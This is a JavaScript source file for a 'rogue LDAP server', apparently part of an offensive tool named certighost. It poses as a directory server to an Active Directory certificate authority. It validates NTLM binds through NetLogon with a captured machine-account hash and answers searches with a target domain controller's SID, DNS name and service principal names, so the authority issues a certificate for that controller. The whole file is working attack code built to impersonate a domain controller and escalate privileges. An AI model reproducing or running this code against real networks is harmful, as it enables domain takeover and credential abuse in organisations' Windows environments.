// Rogue LDAP server for certighost: listens on port 389 via TCPServerSocket,
// handles LDAP BIND (SASL/NTLM validated via NetLogon) and SearchRequest.
// Returns the target DC's attributes so the CA issues a cert for the target.

import { concat } from './certify/ldap/ber.js';
import { Rc4 } from './certify/crypto/rc4.js';
import { md5, hmacMd5 } from './certify/crypto/md5.js';
import { NrpcClient } from './nrpc.js';

const enc = new TextEncoder();
const u16 = (n) => { const b = new Uint8Array(2); new DataView(b.buffer).setUint16(0, n, true); return b; };
const u32le = (n) => { const b = new Uint8Array(4); new DataView(b.buffer).setUint32(0, n >>> 0, true); return b; };
const utf16le = (s) => { const b = new Uint8Array(s.length * 2); for (let i = 0; i < s.length; i++) { b[i * 2] = s.charCodeAt(i) & 0xff; b[i * 2 + 1] = s.charCodeAt(i) >> 8; } return b; };

function buildNtlmChallenge(domainNB, domainDNS, serverNB, serverDNS, challenge) {
  const FL = 0xe2898235;
  const sig = Uint8Array.of(0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00);
  const dnbU = utf16le(domainNB);
  const dnsDomU = utf16le(domainDNS);
  const snbU = utf16le(serverNB);
  const sdnsU = utf16le(serverDNS);

  const avPair = (id, data) => concat([u16(id), u16(data.length), data]);
  const now = BigInt(Date.now() + 11644473600000) * 10000n;
  const ts = new Uint8Array(8);
  new DataView(ts.buffer).setBigUint64(0, now, true);
  const avPairs = concat([
    avPair(2, dnbU), avPair(4, dnsDomU), avPair(1, snbU), avPair(3, sdnsU),
    avPair(7, ts), avPair(0, new Uint8Array(0)),
  ]);

  const hdr = new Uint8Array(56);
  hdr.set(sig, 0);
  const dv = new DataView(hdr.buffer);
  dv.setUint32(8, 2, true);
  dv.setUint16(12, dnbU.length, true); dv.setUint16(14, dnbU.length, true); dv.setUint32(16, 56, true);
  dv.setUint32(20, FL, true);
  hdr.set(challenge, 24);
  dv.setUint16(40, avPairs.length, true); dv.setUint16(42, avPairs.length, true); dv.setUint32(44, 56 + dnbU.length, true);
  hdr.set(Uint8Array.of(0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f), 48);
  return concat([hdr, dnbU, avPairs]);
}

// ---- BER helpers for LDAP messages ------------------------------------------
function berLen(n) {
  if (n < 0x80) return Uint8Array.of(n);
  if (n < 0x100) return Uint8Array.of(0x81, n);
  return Uint8Array.of(0x82, (n >> 8) & 0xff, n & 0xff);
}

function berSeq(inner) { return concat([Uint8Array.of(0x30), berLen(inner.length), inner]); }
function berSet(inner) { return concat([Uint8Array.of(0x31), berLen(inner.length), inner]); }
function berInt(n) { return concat([Uint8Array.of(0x02, 0x01), Uint8Array.of(n & 0xff)]); }
function berOctet(data) {
  const d = typeof data === 'string' ? enc.encode(data) : data;
  return concat([Uint8Array.of(0x04), berLen(d.length), d]);
}
function berEnum(n) { return concat([Uint8Array.of(0x0a, 0x01), Uint8Array.of(n & 0xff)]); }
function berApp(tag, inner) { return concat([Uint8Array.of(0x60 + tag), berLen(inner.length), inner]); }
function berCtx(tag, inner) { return concat([Uint8Array.of(0x80 + tag), berLen(inner.length), inner]); }

function ldapMsg(mid, tag, payload) {
  return berSeq(concat([berInt(mid), concat([Uint8Array.of(tag), berLen(payload.length), payload])]));
}

function ldapBindResponse(mid, resultCode, serverSaslCreds) {
  let inner = concat([berEnum(resultCode), berOctet(''), berOctet('')]);
  if (serverSaslCreds) inner = concat([inner, berCtx(7, serverSaslCreds)]);
  return ldapMsg(mid, 0x61, inner);
}

function ldapSearchEntry(mid, dn, attrs) {
  let attrList = new Uint8Array(0);
  for (const [k, vs] of Object.entries(attrs)) {
    let valSet = new Uint8Array(0);
    for (const v of vs) valSet = concat([valSet, berOctet(typeof v === 'string' ? v : v)]);
    attrList = concat([attrList, berSeq(concat([berOctet(k), berSet(valSet)]))]);
  }
  return ldapMsg(mid, 0x64, concat([berOctet(dn), berSeq(attrList)]));
}

function ldapSearchDone(mid, resultCode) {
  return ldapMsg(mid, 0x65, concat([berEnum(resultCode), berOctet(''), berOctet('')]));
}

// ---- NTLM session key derivation for seal/sign ------------------------------
function ntlmSignKey(sessionKey, mode) {
  const magic = mode === 'server'
    ? 'session key to server-to-client signing key magic constant\0'
    : 'session key to client-to-server signing key magic constant\0';
  return md5(concat([sessionKey, enc.encode(magic)]));
}

function ntlmSealKey(sessionKey, mode) {
  const magic = mode === 'server'
    ? 'session key to server-to-client sealing key magic constant\0'
    : 'session key to client-to-server sealing key magic constant\0';
  return md5(concat([sessionKey, enc.encode(magic)]));
}

class ConnState {
  constructor() { this.sealed = false; this.challenge = null; this.sseq = 0; }

  arm(sessionKey, flags) {
    this.serverSignKey = ntlmSignKey(sessionKey, 'server');
    this.clientSealHandle = new Rc4(ntlmSealKey(sessionKey, 'client'));
    this.serverSealHandle = new Rc4(ntlmSealKey(sessionKey, 'server'));
    this.sealed = true;
  }

  seal(data) {
    const sealed = this.serverSealHandle.update(data);
    const hmac = hmacMd5(this.serverSignKey, concat([u32le(this.sseq), data])).slice(0, 8);
    const checksum = this.serverSealHandle.update(hmac);
    const sig = concat([u32le(1), checksum, u32le(this.sseq)]);
    this.sseq++;
    const framed = new Uint8Array(4 + sig.length + sealed.length);
    new DataView(framed.buffer).setUint32(0, sig.length + sealed.length, false);
    framed.set(sig, 4);
    framed.set(sealed, 4 + sig.length);
    return framed;
  }

  unsealFrame(frame) {
    const data = frame.subarray(16);
    return this.clientSealHandle.update(data);
  }
}

// ---- BER parser (minimal) ---------------------------------------------------
function parseBerLen(buf, off) {
  const f = buf[off++];
  if (f < 0x80) return [f, off];
  const nb = f & 0x7f;
  let len = 0;
  for (let i = 0; i < nb; i++) len = (len << 8) | buf[off++];
  return [len, off];
}

function parseLdapMsg(buf) {
  let off = 1;
  let [seqLen, o] = parseBerLen(buf, off); off = o;
  off++;
  let [idLen, o2] = parseBerLen(buf, off); off = o2;
  let mid = 0;
  for (let i = 0; i < idLen; i++) mid = (mid << 8) | buf[off++];
  const tag = buf[off++];
  let [payLen, o3] = parseBerLen(buf, off); off = o3;
  return { mid, tag, payload: buf.subarray(off, off + payLen), totalLen: o + seqLen };
}

// ---- Rogue LDAP server ------------------------------------------------------
export class RogueLdapServer {
  constructor(opts) {
    this._dcIp = opts.dcIp;
    this._domain = opts.domain;
    this._domainNB = opts.domainNB;
    this._compName = opts.compName;
    this._compHash = opts.compHash;
    this._log = opts.log || (() => {});
    this._dn = opts.domain.split('.').map(p => `DC=${p}`).join(',');

    this._targetDNS = opts.targetDNS;
    this._targetCN = opts.targetCN;
    this._targetSAM = opts.targetSAM;
    this._targetSidBin = opts.targetSidBin;

    this._server = null;
    this._running = false;
  }

  async start(bindAddr = '0.0.0.0', port = 389) {
    this._server = new TCPServerSocket(bindAddr, { localPort: port });
    this._running = true;
    this._log(`Rogue LDAP: listening on ${bindAddr}:${port}`);
    this._acceptLoop();
  }

  async _acceptLoop() {
    try {
      const { readable } = await this._server.opened;
      const reader = readable.getReader();
      while (this._running) {
        const { value: conn, done } = await reader.read();
        if (done) break;
        this._handleClient(conn).catch(e => this._log(`Rogue LDAP client error: ${e.message}`));
      }
    } catch (e) {
      if (this._running) this._log(`Rogue LDAP accept error: ${e.message}`);
    }
  }

  async stop() {
    this._running = false;
    try { await this._server?.close(); } catch {}
  }

  async _handleClient(conn) {
    const { readable, writable } = await conn.opened;
    const reader = readable.getReader();
    const writer = writable.getWriter();
    const st = new ConnState();
    let buf = new Uint8Array(0);

    const send = async (data, doSeal) => {
      if (doSeal && st.sealed) await writer.write(st.seal(data));
      else await writer.write(data);
    };

    try {
      while (true) {
        const { value, done } = await reader.read();
        if (done) break;
        buf = concat([buf, new Uint8Array(value)]);

        while (buf.length > 0) {
          if (!st.sealed) {
            if (buf[0] !== 0x30 || buf.length < 2) break;
            const [seqLen, off] = parseBerLen(buf, 1);
            const total = off + seqLen;
            if (buf.length < total) break;
            const msg = buf.subarray(0, total);
            buf = buf.subarray(total);
            await this._dispatch(send, st, msg, false);
          } else {
            if (buf.length < 4) break;
            const fLen = (buf[0] << 24) | (buf[1] << 16) | (buf[2] << 8) | buf[3];
            if (buf.length < 4 + fLen) break;
            const frame = buf.subarray(4, 4 + fLen);
            buf = buf.subarray(4 + fLen);
            const plain = st.unsealFrame(frame);
            let p = 0;
            while (p < plain.length) {
              if (plain[p] !== 0x30) break;
              const [sl, so] = parseBerLen(plain, p + 1);
              const t = so + sl;
              if (p + t > plain.length) break;
              await this._dispatch(send, st, plain.subarray(p, p + t), true);
              p = p + t;
            }
          }
        }
      }
    } catch (e) {
      if (e.message !== 'disconnected') this._log(`Rogue LDAP: ${e.message}`);
    } finally {
      try { reader.releaseLock(); } catch {}
      try { writer.releaseLock(); } catch {}
      try { await conn.close(); } catch {}
    }
  }

  async _dispatch(send, st, msg, sealed) {
    const parsed = parseLdapMsg(msg);
    const { mid, tag } = parsed;
    if (tag === 0x60) await this._handleBind(send, st, mid, parsed.payload, sealed);
    else if (tag === 0x63) await this._handleSearch(send, st, mid, parsed.payload, sealed);
  }

  async _handleBind(send, st, mid, payload, sealed) {
    let off = 0;
    if (payload[off] !== 0x02) return;
    let [vl, o] = parseBerLen(payload, off + 1); off = o + vl;
    off++; let [nl, o2] = parseBerLen(payload, off); off = o2 + nl;
    const authTag = payload[off];
    if (authTag === 0xa3) {
      off++; let [sl, o3] = parseBerLen(payload, off); off = o3;
      if (payload[off] !== 0x04) return;
      let [ml, o4] = parseBerLen(payload, off + 1); off = o4;
      const mech = new TextDecoder().decode(payload.subarray(off, off + ml));
      off += ml;
      let creds = new Uint8Array(0);
      if (off < o3 + sl && payload[off] === 0x04) {
        let [cl, o5] = parseBerLen(payload, off + 1); off = o5;
        creds = payload.subarray(off, off + cl);
      }

      if ((mech === 'GSS-SPNEGO' || mech === 'GSSAPI') && creds.length >= 12) {
        const ntlmOff = this._findNtlmssp(creds);
        if (ntlmOff >= 0) {
          const ntlmMsg = creds.subarray(ntlmOff);
          const msgType = new DataView(ntlmMsg.buffer, ntlmMsg.byteOffset).getUint32(8, true);

          if (msgType === 1) {
            st.challenge = globalThis.crypto.getRandomValues(new Uint8Array(8));
            const serverName = this._compName.replace(/\$$/, '');
            const ch = buildNtlmChallenge(this._domainNB, this._domain, serverName, `${serverName}.${this._domain}`, st.challenge);
            await send(ldapBindResponse(mid, 14, ch), sealed);
            return;
          }
          if (msgType === 3) {
            try {
              const nlo = new NrpcClient(this._dcIp, this._compName, this._compHash, this._domain, this._log);
              await nlo.setup();
              const result = await nlo.validate(ntlmMsg, st.challenge);
              await nlo.close();
              if (result.errorCode !== 0) {
                this._log(`Rogue LDAP: NetLogon rejected: 0x${result.errorCode.toString(16)}`);
                await send(ldapBindResponse(mid, 49), sealed);
                return;
              }
              st.arm(result.sessionKey, result.flags);
              this._log(`Rogue LDAP: NTLM validated, sealed session established`);
              await send(ldapBindResponse(mid, 0), sealed);
            } catch (e) {
              this._log(`Rogue LDAP: NetLogon error: ${e.message}`);
              await send(ldapBindResponse(mid, 49), sealed);
            }
            return;
          }
        }
      }
    }
    await send(ldapBindResponse(mid, 0), sealed);
  }

  _findNtlmssp(data) {
    const sig = [0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00];
    for (let i = 0; i <= data.length - 8; i++) {
      if (sig.every((b, j) => data[i + j] === b)) return i;
    }
    return -1;
  }

  async _handleSearch(send, st, mid, payload, sealed) {
    let off = 0;
    if (payload[off] !== 0x04) return;
    let [dl, o] = parseBerLen(payload, off + 1); off = o;
    const baseDN = new TextDecoder().decode(payload.subarray(off, off + dl));
    off += dl;

    if (baseDN === '' || baseDN === 'rootDSE') {
      const serverName = this._compName.replace(/\$$/, '');
      const attrs = {
        defaultNamingContext: [this._dn],
        rootDomainNamingContext: [this._dn],
        configurationNamingContext: [`CN=Configuration,${this._dn}`],
        schemaNamingContext: [`CN=Schema,CN=Configuration,${this._dn}`],
        namingContexts: [this._dn, `CN=Configuration,${this._dn}`, `CN=Schema,CN=Configuration,${this._dn}`],
        dnsHostName: [`${serverName}.${this._domain}`],
        ldapServiceName: [`${this._domain}:${serverName.toLowerCase()}$@${this._domain.toUpperCase()}`],
        supportedSASLMechanisms: ['GSSAPI', 'GSS-SPNEGO', 'EXTERNAL', 'DIGEST-MD5'],
        supportedLDAPVersion: ['3', '2'],
        supportedCapabilities: ['1.2.840.113556.1.4.800', '1.2.840.113556.1.4.1670', '1.2.840.113556.1.4.1791', '1.2.840.113556.1.4.1935'],
        domainFunctionality: ['7'],
        forestFunctionality: ['7'],
        domainControllerFunctionality: ['7'],
      };
      await send(ldapSearchEntry(mid, '', attrs), sealed);
      await send(ldapSearchDone(mid, 0), sealed);
    } else {
      const cn = baseDN.split(',')[0];
      let sam = this._targetSAM;
      if (cn.includes('=')) {
        const cv = cn.split('=')[1];
        sam = cv.endsWith('$') ? cv : cv + '$';
      }
      const attrs = {
        objectClass: ['top', 'person', 'organizationalPerson', 'user', 'computer'],
        cn: [this._targetCN || sam.replace(/\$$/, '')],
        sAMAccountName: [this._targetSAM || sam],
        objectSid: [this._targetSidBin],
        objectGUID: [new Uint8Array(16)],
        userAccountControl: ['66048'],
        objectCategory: [`CN=Computer,CN=Schema,CN=Configuration,${this._dn}`],
        dNSHostName: [this._targetDNS],
        servicePrincipalName: [`HOST/${this._targetDNS}`, `HOST/${this._targetCN || sam.replace(/\$$/, '')}`],
      };
      await send(ldapSearchEntry(mid, baseDN, attrs), sealed);
      await send(ldapSearchDone(mid, 0), sealed);
    }
  }
}
